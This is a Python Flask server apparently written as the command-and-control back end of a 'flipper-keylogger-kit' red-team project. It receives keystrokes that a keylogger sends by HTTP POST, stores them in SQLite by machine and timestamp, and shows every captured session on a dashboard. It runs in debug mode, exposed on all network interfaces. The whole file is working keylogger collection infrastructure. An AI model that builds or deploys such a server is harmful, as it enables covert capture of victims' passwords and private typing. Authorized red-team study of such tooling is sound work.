import os
import sqlite3
import datetime
from flask import Flask, request, render_template, g
from pathlib import Path

app = Flask(__name__)

# Database path - CC:\Users\Yoav\Desktop\flipper-keylogger-kit\red-team\c2-server\database\logs.db
BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "database" / "logs.db"

# Database connection  
def get_db():
    """Open a database connection tied to the current request."""   
    db = sqlite3.connect(DB_PATH)
    db.row_factory = sqlite3.Row #access data by name e.g user["username"]
    return db

def init_db():
    """Create the keystrokes table if it doesn't exist yet."""
    db = get_db()
    db.execute("""
        CREATE TABLE IF NOT EXISTS keystrokes (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            machine   TEXT,
            timestamp TEXT,
            data      TEXT
        )
    """)
    db.commit() #save the changes
    db.close() #close the connection

# Routes
@app.route("/log", methods=["POST"]) #POST request to receive the log data
def receive_log():
    """Keylogger sends data here via HTTP POST."""
    machine = request.form.get("machine", "unknown")
    data    = request.form.get("data", "")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    db = get_db()
    db.execute(
        "INSERT INTO keystrokes (machine, timestamp, data) VALUES (?, ?, ?)",
        (machine, timestamp, data)
    )
    db.commit()
    db.close()

    return "OK", 200

@app.route("/")
def dashboard():
    """Main dashboard — shows all captured sessions."""
    db = get_db()
    rows = db.execute(
        "SELECT * FROM keystrokes ORDER BY id DESC"
    ).fetchall()
    db.close()
    return render_template("index.html", rows=rows)

# ── Entry point ───────────────────────────────────────────
if __name__ == "__main__":
    init_db()
    app.run(debug=True, host="0.0.0.0", port=5000)